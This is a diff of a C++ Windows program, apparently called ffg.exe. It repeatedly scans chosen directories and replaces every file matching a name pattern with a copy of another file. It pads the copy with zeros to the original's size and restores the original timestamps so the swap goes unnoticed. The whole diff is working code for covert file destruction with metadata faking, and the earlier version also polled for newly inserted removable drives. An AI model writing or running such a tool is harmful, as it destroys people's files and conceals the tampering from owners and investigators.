@@ -5,192 +5,161 @@
 #include <stdio.h>
 #include <windows.h>
 #include <string>
+#include <set>
 
 using namespace std;
 
 namespace fs = filesystem;
 
-string allDrives;
-
-
-std::ifstream::pos_type GetFileSize(const char* filename)
+ifstream::pos_type GetFileSize(const char* filename)
 {
-    std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
-    return in.tellg();
+  ifstream in(filename, ifstream::ate | ifstream::binary);
+  return in.tellg();
 }
-
-char getRemovableDisk()
-{
-    char drive='0';
-
-    char szLogicalDrives[MAX_PATH];
-    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
-
-    string currentDrives="";
-
-    //cout << dwResult << endl;
-    for(int i=0; i<dwResult; i++)
-    {
-        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90)
-        {
-            currentDrives.append(1, szLogicalDrives[i]);
-
-            if(allDrives.find(szLogicalDrives[i]) > 100)
-            {
-                drive = szLogicalDrives[i];
-            }
-        }
-    }
-
-    allDrives = currentDrives;
-
-    return drive;
-}
-
 
 string GetLastErrorAsString()
 {
-    DWORD errorMessageID = ::GetLastError();
-    if(errorMessageID == 0)
-        return std::string(); //No error message has been recorded
+  DWORD errorMessageID = ::GetLastError();
+  if(errorMessageID == 0)
+  return string(); //No error message has been recorded
 
-    LPSTR messageBuffer = nullptr;
-    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-                                 NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
+  LPSTR messageBuffer = nullptr;
+  size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+     NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
 
-    std::string message(messageBuffer, size);
+  string message(messageBuffer, size);
 
-    LocalFree(messageBuffer);
+  LocalFree(messageBuffer);
 
-    return message;
+  return message;
 }
 
-
-string convertToString(char* a, int size)
-{
-    int i;
-    string s = "";
-    for (i = 0; i < size; i++) {
-        s = s + a[i];
-    }
-    return s;
-}
-
+/*
+ffg.exe file_to_copy file_name_to_replace directory_1 directory_2 ...
+*/
 int main(int argc, char** argv)
 {
-  if(argc != 3)
+  if(argc < 4)
   {
     cerr << "Missing parameters" << endl;
     return 1;
   }
 
-  char driveLetter;
+  set<string> checkedElements;
 
-  while(1){
-       driveLetter = getRemovableDisk();
-       if(driveLetter!='0'){
-           printf("%c \n", driveLetter);
-       }
-
-       Sleep(1000);
-   }
-
-  for (auto& dirEntry: std::filesystem::recursive_directory_iterator(argv[1])) {
-    if (!dirEntry.is_regular_file()) {
-      //std::cout << "Directory: " << dirEntry.path() << std::endl;
-      continue;
-    }
-    std::filesystem::path file = dirEntry.path();
-    //std::cout << "Filename: " << file.filename() << " extension: " << file.extension() << std::endl;
-
-    FILETIME ftCreate;
-    FILETIME ftAccess;
-    FILETIME ftWrite;
-
-    HANDLE hFile1;
-    HANDLE hFile2;
-
-    char fileName[512];
-
-    wcstombs(fileName, file.c_str(), sizeof(fileName));
-
-    char tempFileName[512];
-    strcpy(tempFileName, fileName);
-    strcat(tempFileName, string(".temp").c_str());
-
-    LPCSTR copyFileName = argv[2];
-
-    cout << "fileName : " << fileName << endl;
-    cout << "tempFileName : " << tempFileName << endl;
-
-    fs::remove(tempFileName);
-    fs::copy(copyFileName, tempFileName);
-
-    ofstream myfile1;
-
-    long sourceFileSize = GetFileSize(fileName);
-    long fileSize = GetFileSize(copyFileName);
-
-    cout << fileName << endl;
-    cout << tempFileName << endl;
-    cout << fileSize << endl;
-
-    hFile1 = CreateFile(fileName,                // name of the write
-                        GENERIC_READ,          // open for writing
-                        0,                      // do not share
-                        NULL,                   // default security
-                        OPEN_EXISTING,             // create new file only
-                        FILE_ATTRIBUTE_NORMAL,  // normal file
-                        NULL);                  // no attr. template
-
-    if(!GetFileTime(hFile1, &ftCreate, &ftAccess, &ftWrite))
+  string filePattern = string(argv[2]);
+  while(1)
+  {
+    for(int index = 3; index < argc; index++)
     {
-      printf("Something wrong!\n");
-      cout << GetLastErrorAsString() << endl;
-      return FALSE;
-    }
+      char* directory = argv[index];
 
+      if(!fs::exists(directory))
+        continue;
 
-    CloseHandle(hFile1);
-
-    ofstream myfile;
-    myfile.open(tempFileName, ios::binary | std::ios_base::app);
-
-    long diffSize = sourceFileSize - fileSize;
-
-    if (myfile.is_open())
-    {
-      for(long i = 0; i < diffSize; i++)
+      for (auto& dirEntry: fs::recursive_directory_iterator(directory))
       {
-        myfile << "0";
+        if (!dirEntry.is_regular_file())
+          continue;
+
+        fs::path file = dirEntry.path();
+
+        FILETIME ftCreate;
+        FILETIME ftAccess;
+        FILETIME ftWrite;
+
+        HANDLE hFile1;
+        HANDLE hFile2;
+
+        char fileName[512];
+
+        wcstombs(fileName, file.c_str(), sizeof(fileName));
+
+        string currentFileStr = string(fileName);
+
+        if (checkedElements.find(currentFileStr) != checkedElements.end())
+        {
+          cout << "Already trated : " << currentFileStr << endl;
+          continue;
+        }
+
+        if (currentFileStr.find(filePattern) == string::npos)
+          continue;
+
+        checkedElements.insert(fileName);
+
+        char tempFileName[512];
+        strcpy(tempFileName, fileName);
+        strcat(tempFileName, string(".temp").c_str());
+
+        LPCSTR copyFileName = argv[1];
+
+        fs::remove(tempFileName);
+        fs::copy(copyFileName, tempFileName);
+
+        ofstream myfile1;
+
+        long sourceFileSize = GetFileSize(fileName);
+        long fileSize = GetFileSize(copyFileName);
+
+        hFile1 = CreateFile(fileName,                // name of the write
+                            GENERIC_READ,          // open for writing
+                            0,                      // do not share
+                            NULL,                   // default security
+                            OPEN_EXISTING,             // create new file only
+                            FILE_ATTRIBUTE_NORMAL,  // normal file
+                            NULL);                  // no attr. template
+
+        if(!GetFileTime(hFile1, &ftCreate, &ftAccess, &ftWrite))
+        {
+          printf("Something wrong!\n");
+          cout << GetLastErrorAsString() << endl;
+          return FALSE;
+        }
+
+
+        CloseHandle(hFile1);
+
+        ofstream myfile;
+        myfile.open(tempFileName, ios::binary | ios_base::app);
+
+        long diffSize = sourceFileSize - fileSize;
+
+        if (myfile.is_open())
+        {
+          for(long i = 0; i < diffSize; i++)
+            myfile << "0";
+
+          myfile.flush();
+          myfile.close();
+        }
+        else
+        {
+          cerr << "didn't write" << endl;
+        }
+
+        myfile.close();
+
+        fs::remove(fileName);
+        rename(tempFileName , fileName);
+
+        hFile2 = CreateFile(fileName,                // name of the write
+                            GENERIC_WRITE,          // open for writing
+                            0,                      // do not share
+                            NULL,                   // default security
+                            OPEN_EXISTING,             // create new file only
+                            FILE_ATTRIBUTE_NORMAL,  // normal file
+                            NULL);                  // no attr. template
+
+
+        if(!SetFileTime(hFile2, &ftCreate, &ftAccess, &ftWrite))
+        {
+          cout << GetLastErrorAsString() << endl;
+          return 1;
+        }
       }
-      myfile.flush();
-      myfile.close();
-    }
-    else
-    {
-      std::cerr << "didn't write" << std::endl;
     }
 
-    myfile.close();
-
-    fs::remove(fileName);
-    rename(tempFileName , fileName);
-
-    hFile2 = CreateFile(fileName,                // name of the write
-                        GENERIC_WRITE,          // open for writing
-                        0,                      // do not share
-                        NULL,                   // default security
-                        OPEN_EXISTING,             // create new file only
-                        FILE_ATTRIBUTE_NORMAL,  // normal file
-                        NULL);                  // no attr. template
-
-
-    if(!SetFileTime(hFile2, &ftCreate, &ftAccess, &ftWrite))
-    {
-      printf("Something wrong!\n");
-      cout << GetLastErrorAsString() << endl;
-      return FALSE;
-    }
-   }
+    Sleep(10000);
+  }
 }
